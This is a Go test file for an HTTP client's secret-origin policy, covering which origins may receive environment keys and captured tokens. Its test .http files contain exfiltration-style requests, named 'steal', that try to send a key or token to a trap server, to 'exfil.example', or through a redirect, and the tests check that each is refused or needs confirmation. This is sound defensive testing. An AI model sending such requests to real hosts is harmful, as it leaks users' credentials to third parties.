package session

import (
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"sync/atomic"
	"testing"

	"github.com/vidforull/vegtam/internal/core"
	"github.com/vidforull/vegtam/internal/core/history"
	"github.com/vidforull/vegtam/internal/core/httpfile"
	"github.com/vidforull/vegtam/internal/core/output"
	"github.com/vidforull/vegtam/internal/core/policy"
)

// The secrets of the tests of where secrets go: one from the process
// environment, which the policy binds, and one that a sign-in hands out.
const (
	originsKey   = "0r1g1ns/k3y+v"
	originsToken = "0r1g1ns/t0k+en"
)

// originsServer records the queries it gets and counts the connections
// it accepts: a request refused before it is sent makes none.
type originsServer struct {
	*httptest.Server
	conns atomic.Int32
	mu    sync.Mutex
	got   []string // the path and query of each request, then its X-Key header
}

// newOriginsServer starts a server that signs in with POST /login, which
// hands out originsToken and the id 7, echoes the query of /echo in its body, and
// otherwise answers {"id": "7"}; mux, if any, comes first.
func newOriginsServer(t *testing.T, mux map[string]http.HandlerFunc) *originsServer {
	t.Helper()
	s := &originsServer{}
	s.Server = httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		s.mu.Lock()
		s.got = append(s.got, r.URL.RequestURI()+" "+r.Header.Get("X-Key"))
		s.mu.Unlock()
		if h, ok := mux[r.URL.Path]; ok {
			h(w, r)
			return
		}
		switch r.URL.Path {
		case "/login":
			fmt.Fprintf(w, `{"token": %q, "id": "7"}`, originsToken)
		case "/echo":
			fmt.Fprintf(w, `{"echo": %q}`, r.URL.Query().Get("k"))
		default:
			fmt.Fprint(w, `{"id": "7"}`)
		}
	}))
	s.Config.ConnState = func(_ net.Conn, state http.ConnState) {
		if state == http.StateNew {
			s.conns.Add(1)
		}
	}
	s.Start()
	t.Cleanup(s.Close)
	return s
}

func (s *originsServer) requests() []string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return slices.Clone(s.got)
}

// originsFile writes src, a .http file, to a directory of its own and
// parses it.
func originsFile(t *testing.T, src string) *core.File {
	t.Helper()
	path := filepath.Join(t.TempDir(), "api.http")
	if err := os.WriteFile(path, []byte(src), 0o600); err != nil {
		t.Fatal(err)
	}
	f, err := httpfile.ParseFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return f
}

// originsSession returns a session whose policy binds
// {{$env VEGTAM_ORIGINS_KEY}} to allowed. Without a person, its secrets go
// through a keeper, which asks its person only of one that is not bound
// to where its request goes, and they say no (see declined).
func originsSession(t *testing.T, dryRun bool, c Confirm, allowed ...string) *Session {
	t.Helper()
	t.Setenv("VEGTAM_ORIGINS_KEY", originsKey)
	opts := Options{
		DryRun: dryRun, MaxBody: 1 << 20, Confirm: c,
		Secrets: policy.Secrets{Env: map[string][]string{"VEGTAM_ORIGINS_KEY": allowed}},
	}
	if !c.Person {
		opts.Keeper = newKeeper(t, Options{MaxBody: 1 << 20, Secrets: opts.Secrets}, false, errDeclined)
	}
	return New(opts)
}

// declined is what the error of a request that a keeper refused for a
// secret not bound to where it goes ends with: its person said no.
const declined = "; and the keeper's operator did not confirm it: declined"

// runNamed prepares and runs with s the request of f named name.
func runNamed(t *testing.T, s *Session, f *core.File, name string) *output.Result {
	t.Helper()
	i := slices.IndexFunc(f.Requests, func(r *core.Request) bool { return r.Name == name })
	if i < 0 {
		t.Fatalf("no request %q", name)
	}
	return s.Run(t.Context(), s.Prepare(t.Context(), f, i))
}

// noLeak fails the test if res shows a secret value.
func noLeak(t *testing.T, res *output.Result) {
	t.Helper()
	if s := fmt.Sprintf("%+v %+v %+v %+v %+v", res.Error, res.Confirm, res.Request, res.Response, res.SecretOrigins); strings.Contains(s, originsKey) || strings.Contains(s, originsToken) {
		t.Errorf("a secret value in %s", s)
	}
}

// TestOriginsPerson checks a request that would send a secret where it
// is not bound: without a person, an error of kind policy that no
// confirmation lifts; with one, an error of kind confirm until they
// confirm it, and then it is sent.
func TestOriginsPerson(t *testing.T) {
	a, trap := newOriginsServer(t, nil), newOriginsServer(t, nil)
	f := originsFile(t, "# @name allowed\nGET "+a.URL+"/?k={{$env VEGTAM_ORIGINS_KEY}}\n\n###\n# @name steal\nGET "+trap.URL+"/?k={{$env VEGTAM_ORIGINS_KEY}}\n")
	key, err := Key(f.Path, 1)
	if err != nil {
		t.Fatal(err)
	}
	ref := f.Path + "#steal"
	wantSecret := output.Secret{Name: "{{$env VEGTAM_ORIGINS_KEY}}", Origin: trap.URL, Allowed: []string{a.URL}}
	equal := func(s *output.Secret) bool {
		return s != nil && s.Name == wantSecret.Name && s.Origin == wantSecret.Origin && slices.Equal(s.Allowed, wantSecret.Allowed) && !s.Captured
	}

	for _, c := range []Confirm{{}, {Mutations: true}, {All: true}, {Requests: []string{key}}} {
		s := originsSession(t, false, c, a.URL)
		if res := runNamed(t, s, f, "allowed"); res.Error != nil || res.Response == nil {
			t.Errorf("%+v: to where it may go: %+v", c, res.Error)
		}
		res := runNamed(t, s, f, "steal")
		want := "GET " + trap.URL + "/?k={{$env VEGTAM_ORIGINS_KEY}} is not sent: secret {{$env VEGTAM_ORIGINS_KEY}} may not go to " + trap.URL +
			": its allowed origins are " + a.URL + "; allow it in the policy (secrets)" + declined
		if e := res.Error; e == nil || e.Kind != core.KindPolicy || e.Message != want || !equal(e.Secret) || e.Confirm != nil || res.Response != nil {
			t.Errorf("%+v, no person: %+v", c, res.Error)
		}
		noLeak(t, res)
	}

	s := originsSession(t, false, Confirm{Mutations: true, Person: true}, a.URL)
	res := runNamed(t, s, f, "steal")
	e := res.Error
	if e == nil || e.Kind != core.KindConfirm || e.Confirm == nil || e.Confirm.Reason != core.ReasonSecret || e.Confirm.Flag != "--confirm="+ref ||
		e.Confirm.Method != http.MethodGet || e.Confirm.URL != trap.URL+"/?k={{$env VEGTAM_ORIGINS_KEY}}" || !equal(e.Confirm.Secret) || !equal(e.Secret) ||
		!strings.HasSuffix(e.Message, "; or --confirm="+ref+" sends it this once") || res.Response != nil {
		t.Errorf("a person, not confirmed: %+v", e)
	}
	noLeak(t, res)
	if n := trap.conns.Load(); n != 0 {
		t.Fatalf("refused, the trap took %d connections: %q", n, trap.requests())
	}

	// --confirm alone confirms the run before its requests are seen: it
	// does not let a secret go where it is not bound.
	if res := runNamed(t, originsSession(t, false, Confirm{Person: true, All: true}, a.URL), f, "steal"); res.Error == nil ||
		res.Error.Kind != core.KindConfirm || res.Error.Confirm.Reason != core.ReasonSecret {
		t.Errorf("a person, every request confirmed: %+v", res.Error)
	}
	if n := trap.conns.Load(); n != 0 {
		t.Fatalf("refused, the trap took %d connections: %q", n, trap.requests())
	}
	// A person who confirms that request sends it, each time they do.
	if res := runNamed(t, originsSession(t, false, Confirm{Person: true, Requests: []string{key}}, a.URL), f, "steal"); res.Error != nil || res.Response == nil {
		t.Errorf("a person, the request confirmed: %+v", res.Error)
	}
	s.ConfirmOnce(f, 1)
	if res := runNamed(t, s, f, "steal"); res.Error != nil || res.Response == nil {
		t.Errorf("confirmed once: %+v", res.Error)
	}
	if res := runNamed(t, s, f, "steal"); res.Error == nil || res.Error.Kind != core.KindConfirm {
		t.Errorf("again after the confirmation was used: %+v", res.Error)
	}
	if got := trap.requests(); len(got) != 2 || got[0] != "/?k="+originsKey+" " {
		t.Errorf("the trap got %q, want 2 confirmed requests", got)
	}
}

// TestOriginsConfirmComma checks that --confirm alone does not name a
// request whose ref has a comma, which --confirm=<ref> cannot name: the
// files of a run are someone else's to name, and a run confirmed for its
// methods would send its secrets anywhere. The error says so, with no
// flag; the terminal interface's confirmation still names it.
func TestOriginsConfirmComma(t *testing.T) {
	trap := newOriginsServer(t, nil)
	path := filepath.Join(t.TempDir(), "a,b.http")
	if err := os.WriteFile(path, []byte("GET "+trap.URL+"/?k={{$env VEGTAM_ORIGINS_KEY}}\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	f, err := httpfile.ParseFile(path)
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range []Confirm{{Person: true}, {Person: true, All: true}} {
		s := originsSession(t, false, c, "https://api.example.test")
		res := s.Run(t.Context(), s.Prepare(t.Context(), f, 0))
		if e := res.Error; e == nil || e.Kind != core.KindConfirm || e.Confirm == nil || e.Confirm.Flag != "" ||
			!strings.Contains(e.Message, "cannot be named by --confirm=<ref>: bind the secret, or send it from vegtam tui") {
			t.Errorf("%+v: %+v", c, e)
		}
	}
	s := originsSession(t, false, Confirm{Person: true}, "https://api.example.test")
	s.ConfirmOnce(f, 0)
	if res := s.Run(t.Context(), s.Prepare(t.Context(), f, 0)); res.Error != nil || len(trap.requests()) != 1 {
		t.Errorf("ConfirmOnce: %+v; the trap got %q", res.Error, trap.requests())
	}
}

// TestOriginsConfirmedThere checks that a confirmation lets the secrets
// go to the origin of the request alone: a redirect to another one with
// a secret in the URL is still refused, before it is followed.
func TestOriginsConfirmedThere(t *testing.T) {
	trap := newOriginsServer(t, nil)
	b := newOriginsServer(t, map[string]http.HandlerFunc{"/away": func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, trap.URL+"/stolen?"+r.URL.RawQuery, http.StatusFound)
	}})
	f := originsFile(t, "GET "+b.URL+"/away?k={{$env VEGTAM_ORIGINS_KEY}}\n")
	key, err := Key(f.Path, 0)
	if err != nil {
		t.Fatal(err)
	}
	s := originsSession(t, false, Confirm{Person: true, Requests: []string{key}}, "https://api.example.test")
	res := s.Run(t.Context(), s.Prepare(t.Context(), f, 0))
	if e := res.Error; e == nil || e.Kind != core.KindPolicy || e.Secret == nil || e.Secret.Origin != trap.URL ||
		!slices.Equal(e.Secret.Allowed, []string{b.URL, "https://api.example.test"}) || !strings.HasPrefix(e.Message, "refused a redirect to "+trap.URL) {
		t.Errorf("confirmed, redirected elsewhere: %+v", e)
	}
	noLeak(t, res)
	if got := b.requests(); len(got) != 1 || trap.conns.Load() != 0 {
		t.Errorf("b got %q, the trap %d connections", got, trap.conns.Load())
	}
}

// captureRequests sign in on a, which hands out a token, then send it
// back there, and to the trap.
func captureRequests(a, trap string) string {
	return "# @name login\n# @capture token = $.token\n# @capture plain id = $.id\nPOST " + a + "/login\n\n" +
		"###\n# @name me\nGET " + a + "/me\nAuthorization: Bearer {{token}}\n\n" +
		"###\n# @name steal\nGET " + trap + "/?t={{token}}\n\n" +
		"###\n# @name steal-header\nGET " + trap + "/\nX-Key: {{token}}\n\n" +
		"###\n# @name steal-body\nPOST " + trap + "/\n\n{\"t\": \"{{token}}\"}\n"
}

// TestOriginsCaptures checks that a secret value an @capture takes goes
// back to the origin of the response it came from alone, wherever the
// request holds it, and that a plain one goes anywhere.
func TestOriginsCaptures(t *testing.T) {
	a, trap := newOriginsServer(t, nil), newOriginsServer(t, nil)
	f := originsFile(t, captureRequests(a.URL, trap.URL))
	s := originsSession(t, false, Confirm{Mutations: true})
	if res := runNamed(t, s, f, "login"); res.Error != nil || len(res.Captures) != 2 || !res.Captures[0].Secret || res.Captures[1].Secret {
		t.Fatalf("login: %+v, %+v", res.Error, res.Captures)
	}
	if got := s.Bound(); len(got) != 1 || !slices.Equal(got["token"], []string{a.URL}) {
		t.Errorf("Bound() = %v", got)
	}
	if res := runNamed(t, s, f, "me"); res.Error != nil || res.Response == nil {
		t.Errorf("me: %+v", res.Error)
	}
	for _, name := range []string{"steal", "steal-header", "steal-body"} {
		res := runNamed(t, s, f, name)
		if e := res.Error; e == nil || e.Kind != core.KindPolicy || e.Secret == nil || e.Secret.Name != "{{token}}" || !e.Secret.Captured ||
			e.Secret.Origin != trap.URL || !slices.Equal(e.Secret.Allowed, []string{a.URL}) ||
			!strings.HasSuffix(e.Message, "it was captured from a response of "+a.URL+", and goes back there alone"+declined) {
			t.Errorf("%s: %+v", name, res.Error)
		}
		noLeak(t, res)
	}
	if n := trap.conns.Load(); n != 0 {
		t.Errorf("the trap took %d connections: %q", n, trap.requests())
	}
	if got := a.requests(); len(got) != 2 || got[1] != "/me " {
		t.Errorf("a got %q", got)
	}

	// A plain value goes anywhere.
	plain := originsFile(t, "GET "+trap.URL+"/users/{{id}}\n")
	s.Declare("id")
	if res := s.Run(t.Context(), s.Prepare(t.Context(), plain, 0)); res.Error != nil || res.Response == nil {
		t.Errorf("a plain capture elsewhere: %+v", res.Error)
	}
	if got := trap.requests(); len(got) != 1 || got[0] != "/users/7 " {
		t.Errorf("the trap got %q", got)
	}
}

// TestOriginsCaptureRedirected checks that a captured secret is bound to
// the origin of the response it came from, the last hop of a redirect,
// not to that of the request.
func TestOriginsCaptureRedirected(t *testing.T) {
	c := newOriginsServer(t, nil)
	a := newOriginsServer(t, map[string]http.HandlerFunc{"/login": func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, c.URL+"/login", http.StatusTemporaryRedirect)
	}})
	f := originsFile(t, "# @name login\n# @capture token = $.token\nPOST "+a.URL+"/login\n\n"+
		"###\n# @name a\nGET "+a.URL+"/?t={{token}}\n\n###\n# @name c\nGET "+c.URL+"/?t={{token}}\n")
	s := originsSession(t, false, Confirm{Mutations: true})
	if res := runNamed(t, s, f, "login"); res.Error != nil || len(res.Captures) != 1 {
		t.Fatalf("login: %+v", res.Error)
	}
	if res := runNamed(t, s, f, "a"); res.Error == nil || res.Error.Secret == nil || !slices.Equal(res.Error.Secret.Allowed, []string{c.URL}) {
		t.Errorf("to the origin of the request: %+v", res.Error)
	}
	if res := runNamed(t, s, f, "c"); res.Error != nil {
		t.Errorf("to the origin of the response: %+v", res.Error)
	}
}

// TestOriginsEcho checks that a plain capture whose value holds a secret,
// as a response that echoes the request holds it, is that secret still:
// it is masked, and goes back to the origin of the response alone.
func TestOriginsEcho(t *testing.T) {
	a, trap := newOriginsServer(t, nil), newOriginsServer(t, nil)
	f := originsFile(t, "# @name echo\n# @capture plain echoed = $.echo\nGET "+a.URL+"/echo?k={{$env VEGTAM_ORIGINS_KEY}}\n\n"+
		"###\n# @name steal\nGET "+trap.URL+"/?e={{echoed}}\n")
	s := originsSession(t, false, Confirm{}, a.URL)
	res := runNamed(t, s, f, "echo")
	if res.Error != nil || len(res.Captures) != 1 || res.Captures[0] != (output.Capture{Name: "echoed", Source: "$.echo", Secret: true}) ||
		!strings.Contains(res.Response.Body, `"echo": "***"`) {
		t.Fatalf("echo: %+v, %+v, %+v", res.Error, res.Captures, res.Response)
	}
	noLeak(t, res)
	res = runNamed(t, s, f, "steal")
	if e := res.Error; e == nil || e.Kind != core.KindPolicy || e.Secret == nil || e.Secret.Name != "{{echoed}}" || !e.Secret.Captured ||
		!slices.Equal(e.Secret.Allowed, []string{a.URL}) {
		t.Errorf("steal: %+v", res.Error)
	}
	noLeak(t, res)
	if n := trap.conns.Load(); n != 0 {
		t.Errorf("the trap took %d connections: %q", n, trap.requests())
	}
}

// TestOriginsDryRun checks what a dry run says of the secrets of each
// request, and that it refuses what a run would, sending nothing: the
// captures of a request are bound to where it goes.
func TestOriginsDryRun(t *testing.T) {
	a, trap := newOriginsServer(t, nil), newOriginsServer(t, nil)
	f := originsFile(t, captureRequests(a.URL, trap.URL)+"\n###\n# @name key\n# @note Sends the key\nGET "+trap.URL+"/?k={{$env VEGTAM_ORIGINS_KEY}}\n")
	token := output.Secret{Name: "{{token}}", Origin: trap.URL, Allowed: []string{a.URL}, Captured: true}
	equal := func(got *output.Secret, want output.Secret) bool {
		return got != nil && got.Name == want.Name && got.Origin == want.Origin && slices.Equal(got.Allowed, want.Allowed) && got.Captured == want.Captured
	}

	dry := originsSession(t, true, Confirm{}, a.URL)
	if res := runNamed(t, dry, f, "login"); res.Error != nil || res.SecretOrigins != nil {
		t.Errorf("login: %+v, %+v", res.Error, res.SecretOrigins)
	}
	if got := dry.Bound(); len(got) != 2 || !slices.Equal(got["token"], []string{a.URL}) {
		t.Errorf("Bound() of the dry run = %v", got)
	}
	res := runNamed(t, dry, f, "me")
	if res.Error != nil || len(res.SecretOrigins) != 1 || !equal(&res.SecretOrigins[0], output.Secret{Name: "{{token}}", Origin: a.URL, Allowed: []string{a.URL}, Captured: true}) {
		t.Errorf("me: %+v, %+v", res.Error, res.SecretOrigins)
	}
	for _, name := range []string{"steal", "steal-header", "steal-body"} {
		res = runNamed(t, dry, f, name)
		if e := res.Error; e == nil || e.Kind != core.KindPolicy || !equal(e.Secret, token) || len(res.SecretOrigins) != 1 || !equal(&res.SecretOrigins[0], token) {
			t.Errorf("%s: %+v, %+v", name, res.Error, res.SecretOrigins)
		}
	}
	key := output.Secret{Name: "{{$env VEGTAM_ORIGINS_KEY}}", Origin: trap.URL, Allowed: []string{a.URL}}
	if res = runNamed(t, dry, f, "key"); res.Error == nil || res.Error.Kind != core.KindPolicy || !equal(res.Error.Secret, key) ||
		res.Confirm == nil || res.Confirm.Reason != core.ReasonNote {
		t.Errorf("key: %+v, %+v", res.Error, res.Confirm)
	}

	// With a person, what a run would ask them for.
	person := originsSession(t, true, Confirm{Mutations: true, Person: true}, a.URL)
	runNamed(t, person, f, "login")
	res = runNamed(t, person, f, "steal")
	if c := res.Confirm; res.Error != nil || c == nil || c.Reason != core.ReasonSecret || c.Flag != "--confirm="+f.Path+"#steal" || !equal(c.Secret, token) {
		t.Errorf("steal, a person: %+v, %+v", res.Error, res.Confirm)
	}
	// An @note asks for them anyway, and says which secret too.
	if res = runNamed(t, person, f, "key"); res.Error != nil || res.Confirm == nil || res.Confirm.Reason != core.ReasonNote || !equal(res.Confirm.Secret, key) {
		t.Errorf("key, a person: %+v, %+v", res.Error, res.Confirm)
	}
	// Confirmed by name, nothing more to ask; --confirm alone does not
	// name it.
	steal, err := Key(f.Path, slices.IndexFunc(f.Requests, func(r *core.Request) bool { return r.Name == "steal" }))
	if err != nil {
		t.Fatal(err)
	}
	all := originsSession(t, true, Confirm{Mutations: true, Person: true, All: true}, a.URL)
	runNamed(t, all, f, "login")
	if res = runNamed(t, all, f, "steal"); res.Error != nil || res.Confirm == nil || res.Confirm.Reason != core.ReasonSecret {
		t.Errorf("steal, every request confirmed: %+v, %+v", res.Error, res.Confirm)
	}
	confirmed := originsSession(t, true, Confirm{Mutations: true, Person: true, Requests: []string{steal}}, a.URL)
	runNamed(t, confirmed, f, "login")
	if res = runNamed(t, confirmed, f, "steal"); res.Error != nil || res.Confirm != nil || len(res.SecretOrigins) != 1 {
		t.Errorf("steal, confirmed: %+v, %+v", res.Error, res.Confirm)
	}

	// A preview binds what the session it previews has captured.
	preview := originsSession(t, true, Confirm{}, a.URL)
	preview.Declare("token")
	preview.Bind("token", a.URL)
	if res = runNamed(t, preview, f, "steal"); res.Error == nil || !equal(res.Error.Secret, token) {
		t.Errorf("preview: %+v", res.Error)
	}
	preview.Bind("token", "")
	if got := preview.Bound(); len(got) != 0 {
		t.Errorf("Bound() after the binding is dropped = %v", got)
	}
	res = runNamed(t, preview, f, "steal")
	if e := res.Error; e == nil || e.Secret == nil || len(e.Secret.Allowed) != 0 ||
		!strings.Contains(e.Message, "it was captured from a response whose origin is not known, and goes nowhere") {
		t.Errorf("preview with no binding: %+v", res.Error)
	}
	if a.conns.Load()+trap.conns.Load() != 0 {
		t.Errorf("a dry run made %d connections", a.conns.Load()+trap.conns.Load())
	}
}

// TestOriginsBindings checks what Bindings says of a job before it is
// sent: its secrets, where it goes and where each may go, as far as the
// session knows them.
func TestOriginsBindings(t *testing.T) {
	f := originsFile(t, "# @name login\n# @capture token = $.token\nPOST https://api.example.test/login\n\n"+
		"###\nGET https://exfil.example/?k={{$env VEGTAM_ORIGINS_KEY}}&t={{token}}\n\n###\nGET {{nothing}}/x\n")
	s := originsSession(t, true, Confirm{}, "https://api.example.test")
	login, steal := s.Prepare(t.Context(), f, 0), s.Prepare(t.Context(), f, 1)
	if got := s.Bindings(s.Prepare(t.Context(), f, 2)); got != nil {
		t.Errorf("Bindings of a request that is not resolved = %+v", got)
	}
	if got := s.Bindings(login); got != nil {
		t.Errorf("Bindings of a request without secrets = %+v", got)
	}
	want := []core.Bound{
		{Name: "{{$env VEGTAM_ORIGINS_KEY}}", Origin: "https://exfil.example", Allowed: []string{"https://api.example.test"}},
		{Name: "{{token}}", Origin: "https://exfil.example", Capture: true},
	}
	same := func(got []core.Bound) bool {
		return slices.EqualFunc(got, want, func(a, b core.Bound) bool {
			return a.Name == b.Name && a.Origin == b.Origin && slices.Equal(a.Allowed, b.Allowed) && a.Capture == b.Capture
		})
	}
	if got := s.Bindings(steal); !same(got) {
		t.Errorf("Bindings before the sign-in = %+v", got)
	}
	// Once the dry run has seen the sign-in, the token goes where it does.
	s.Run(t.Context(), login)
	want[1].Allowed = []string{"https://api.example.test"}
	if got := s.Bindings(steal); !same(got) {
		t.Errorf("Bindings after the sign-in = %+v", got)
	}
}

// TestOriginsHistory checks that the history keeps a request refused for
// its secrets, as policy without a person and as confirm with one.
func TestOriginsHistory(t *testing.T) {
	trap := newOriginsServer(t, nil)
	f := originsFile(t, "GET "+trap.URL+"/?k={{$env VEGTAM_ORIGINS_KEY}}\n")
	t.Setenv("VEGTAM_ORIGINS_KEY", originsKey)
	log := history.New(filepath.Join(t.TempDir(), "vegtam"))
	for _, c := range []Confirm{{}, {Person: true}} {
		s := New(Options{MaxBody: 1 << 20, History: log, Confirm: c}) // the policy binds nothing
		s.Run(t.Context(), s.Prepare(t.Context(), f, 0))
		if err := s.HistoryError(); err != nil {
			t.Fatal(err)
		}
	}
	runs, err := log.Last(10)
	if err != nil || len(runs) != 2 || runs[0].Result != "confirm" || runs[1].Result != "policy" || runs[0].Status != 0 ||
		runs[0].URL != trap.URL+"/?k={{$env VEGTAM_ORIGINS_KEY}}" {
		t.Errorf("history %+v, %v", runs, err)
	}
	if n := trap.conns.Load(); n != 0 {
		t.Errorf("the trap took %d connections", n)
	}
}

// TestOriginsDryRunPlainCapture checks that a dry run treats a plain
// capture as a run does: it is no secret, and goes anywhere; and that a
// preview says which of the variables it declares are plain.
func TestOriginsDryRunPlainCapture(t *testing.T) {
	a, trap := newOriginsServer(t, nil), newOriginsServer(t, nil)
	f := originsFile(t, captureRequests(a.URL, trap.URL)+"\n###\n# @name user\nGET "+trap.URL+"/users/{{id}}\n")
	run := originsSession(t, false, Confirm{Mutations: true})
	runNamed(t, run, f, "login")
	if res := runNamed(t, run, f, "user"); res.Error != nil {
		t.Fatalf("run: %+v", res.Error)
	}
	dry := originsSession(t, true, Confirm{Mutations: true})
	runNamed(t, dry, f, "login")
	if got := dry.Plain(); !slices.Equal(got, []string{"id"}) {
		t.Errorf("Plain() = %q", got)
	}
	if res := runNamed(t, dry, f, "user"); res.Error != nil || res.SecretOrigins != nil {
		t.Errorf("dry run: %+v, secret origins %+v; the run sent it", res.Error, res.SecretOrigins)
	}
	if res := runNamed(t, dry, f, "steal"); res.Error == nil || res.Error.Secret == nil || res.Error.Secret.Name != "{{token}}" {
		t.Errorf("dry run of the secret capture: %+v", res.Error)
	}

	// A preview declares what the session it previews has, plain or not.
	preview := originsSession(t, true, Confirm{})
	preview.Declare("token")
	preview.DeclarePlain("id")
	if res := runNamed(t, preview, f, "user"); res.Error != nil || res.SecretOrigins != nil {
		t.Errorf("preview of a plain capture: %+v, %+v", res.Error, res.SecretOrigins)
	}
	// Declared again as a secret, it is one.
	preview.Declare("id")
	if got := preview.Plain(); len(got) != 0 {
		t.Errorf("Plain() after Declare = %q", got)
	}
	if res := runNamed(t, preview, f, "user"); res.Error == nil || res.Error.Kind != core.KindPolicy || res.Error.Secret == nil || res.Error.Secret.Name != "{{id}}" {
		t.Errorf("preview of a secret capture: %+v", res.Error)
	}
	if a.conns.Load() != 1 || trap.conns.Load() != 1 {
		t.Errorf("a took %d connections, the trap %d; want the run's alone", a.conns.Load(), trap.conns.Load())
	}
}

// TestOriginsHostHeader checks that a Host header that names another
// host binds what the request captures to both of its origins, and that
// each must be among those of a secret it sends: without a person, the
// request is refused before anything is sent.
func TestOriginsHostHeader(t *testing.T) {
	a := newOriginsServer(t, nil)
	f := originsFile(t, "# @name login\n# @capture token = $.token\nPOST "+a.URL+"/login\nHost: api.example.test\n\n"+
		"###\n# @name me\nGET "+a.URL+"/me\nHost: api.example.test\nX-Key: {{token}}\n\n"+
		"###\n# @name front\nGET "+a.URL+"/me\nHost: other.example.test\nX-Key: {{token}}\n")
	s := originsSession(t, false, Confirm{Mutations: true})
	if res := runNamed(t, s, f, "login"); res.Error != nil {
		t.Fatalf("login: %+v", res.Error)
	}
	if got := s.Bound(); !slices.Equal(got["token"], []string{a.URL, "http://api.example.test"}) {
		t.Errorf("Bound() = %v", got)
	}
	if res := runNamed(t, s, f, "me"); res.Error != nil {
		t.Errorf("me: %+v", res.Error)
	}
	res := runNamed(t, s, f, "front")
	if e := res.Error; e == nil || e.Kind != core.KindPolicy || e.Secret == nil || e.Secret.Origin != "http://other.example.test" {
		t.Errorf("front: %+v", res.Error)
	}
	noLeak(t, res)
	if got := a.requests(); len(got) != 2 {
		t.Errorf("the server got %q, want login and me alone", got)
	}
}
